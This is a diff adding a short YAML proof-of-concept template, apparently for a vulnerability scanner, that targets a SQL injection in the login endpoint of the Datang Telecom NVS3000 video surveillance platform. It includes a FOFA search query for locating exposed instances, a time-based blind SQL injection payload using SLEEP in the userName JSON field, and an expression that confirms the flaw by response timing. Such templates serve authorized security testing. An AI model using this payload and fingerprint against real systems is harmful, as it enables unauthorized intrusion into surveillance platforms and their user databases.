@@ -1,0 +1,21 @@
+id: poc-yaml-datang-nvs3000-integrated-video-surveillance-platform-sqli
+info:
+  name: 大唐电信NVS3000综合视频监控平台 sql注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 综合视频监控平台
+  fofa: body="综合视频监控平台" && body="验证码"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /nvsthird/ocxUserLogin
+  headers:
+    Content-Type: application/json
+  data: '{"userName":"asda'' AND (SELECT 4094 FROM (SELECT(SLEEP({{.t1}})))hyJC) AND
+    ''FYBK''=''FYBK","password":"sadsa","code":"67a5"}'
+  expression: status_code == 200 && contains(body,"\"userId\"") && contains(headers,"application/json")
+    && duration > t1 && duration < t2
+transport: http
